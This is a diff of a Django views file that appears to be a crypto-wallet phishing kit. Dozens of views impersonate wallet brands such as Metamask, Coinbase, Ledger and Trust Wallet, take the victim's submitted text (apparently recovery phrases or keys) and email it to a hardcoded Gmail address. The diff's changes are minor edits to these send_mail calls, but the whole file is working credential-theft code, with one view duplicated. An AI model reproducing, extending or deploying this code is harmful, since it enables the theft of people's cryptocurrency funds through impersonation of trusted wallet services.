@@ -1,7 +1,7 @@
 from django.shortcuts import render, redirect
 from django.http import HttpResponseRedirect, HttpResponse
 from django.views.generic import TemplateView
-
+from django.template.loader import render_to_string
 from django.core.mail import send_mail
 
 
@@ -27,7 +27,7 @@ def input(request):
             'Metamask wallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'input.html') 
@@ -49,7 +49,7 @@ def coinbase(request):
             'coinbase wallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'coinbase.html') 
@@ -71,7 +71,7 @@ def alphawallet(request):
             'alphawallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'alphawallet.html') 
@@ -93,7 +93,7 @@ def argentwallet(request):
             'argentwallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'argentwallet.html') 
@@ -108,13 +108,13 @@ def metamask(request):
 			'message': message,
 		
 		}
-		
+		message = render_to_string('metamask.html', data)
 		send_mail(
             'Bitcoin',
             'metamask : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'metamask.html') 
@@ -135,7 +135,7 @@ def trustwallet(request):
             'trustwallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'trustwallet.html') 
@@ -156,7 +156,7 @@ def coin98(request):
             'coin98 : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'coin98.html') 
@@ -176,7 +176,7 @@ def coinomi(request):
             'coinomi : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'coinomi.html') 
@@ -196,7 +196,7 @@ def crypto(request):
             'crypto : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'crypto.html') 
@@ -217,7 +217,7 @@ def eidoo(request):
             'eidoo : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'eidoo.html') 
@@ -238,7 +238,7 @@ def exodus(request):
             'exodus : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'exodus.html') 
@@ -259,7 +259,7 @@ def gridplus(request):
             'gridplus : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'gridplus.html') 
@@ -279,7 +279,7 @@ def huobi(request):
             'huobi : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'huobi.html') 
@@ -300,7 +300,7 @@ def imtoken(request):
             'imtoken : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'imtoken.html') 
@@ -321,7 +321,7 @@ def infinitowallet(request):
             'infinitowallet : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'infinitowallet.html') 
@@ -342,7 +342,7 @@ def infinity(request):
             'infinity : ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'infinity.html') 
@@ -364,7 +364,7 @@ def ledger(request):
             'ledger wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'ledger.html') 
@@ -386,7 +386,7 @@ def mathwallet(request):
             'math wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'mathwallet.html') 
@@ -406,7 +406,7 @@ def atomic(request):
             'atomic: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'atomic.html') 
@@ -427,7 +427,7 @@ def mew(request):
             'mew: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'mew.html') 
@@ -447,7 +447,7 @@ def midas(request):
             'midas: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'midas.html') 
@@ -468,7 +468,7 @@ def moriX(request):
             'moriX: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'moriX.html') 
@@ -488,7 +488,7 @@ def mykey(request):
             'mykey: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'mykey.html') 
@@ -509,7 +509,7 @@ def nash(request):
             'nash: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'nash.html') 
@@ -530,7 +530,7 @@ def onto(request):
             'onto: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'onto.html') 
@@ -552,7 +552,7 @@ def ownbit(request):
             'ownbit: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'ownbit.html') 
@@ -573,7 +573,7 @@ def peakdefi(request):
             'peakdefi: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'peakdefi.html') 
@@ -594,7 +594,7 @@ def pillar(request):
             'pillar: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'pillar.html') 
@@ -615,7 +615,7 @@ def rainbow(request):
             'rainbow: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'rainbow.html') 
@@ -636,7 +636,7 @@ def safepal(request):
             'safepal wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'safepal.html') 
@@ -657,7 +657,7 @@ def safepal(request):
             'safepal wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'safepal.html') 
@@ -679,7 +679,7 @@ def sparkpoint(request):
             'spark point wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'sparkpoint.html') 
@@ -701,7 +701,7 @@ def spatium(request):
             'spatium wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'spatium.html') 
@@ -723,7 +723,7 @@ def swft(request):
             'swft wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'swft.html') 
@@ -745,7 +745,7 @@ def tokenpocket(request):
             'token pocket wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'tokenpocket.html') 
@@ -767,7 +767,7 @@ def tokenpockett(request):
             'token pocket wallet 2: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'tokenpockett.html') 
@@ -788,7 +788,7 @@ def tronlink(request):
             'tronlink: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'tronlink.html') 
@@ -810,7 +810,7 @@ def atwallet(request):
             'atwallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'atwallet.html') 
@@ -831,7 +831,7 @@ def unstoppable(request):
             'unstoppable wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'unstoppable.html') 
@@ -852,7 +852,7 @@ def vision(request):
             'vision wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'vision.html') 
@@ -873,7 +873,7 @@ def walleth(request):
             'walleth: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'walleth.html') 
@@ -894,7 +894,7 @@ def walletio(request):
             'walleth IO: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'walletio.html') 
@@ -915,7 +915,7 @@ def xdc(request):
             'XDC wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'xdc.html') 
@@ -936,7 +936,7 @@ def zelcore(request):
             'zelcore wallet: ' , data['message'],
             'smileinnovativesolutions@gmail.com',
             ['ladsavvy@gmail.com'],
-            fail_silently=False,
+            
         )
 		return redirect('/barcode/')
 	return render(request,'zelcore.html') 
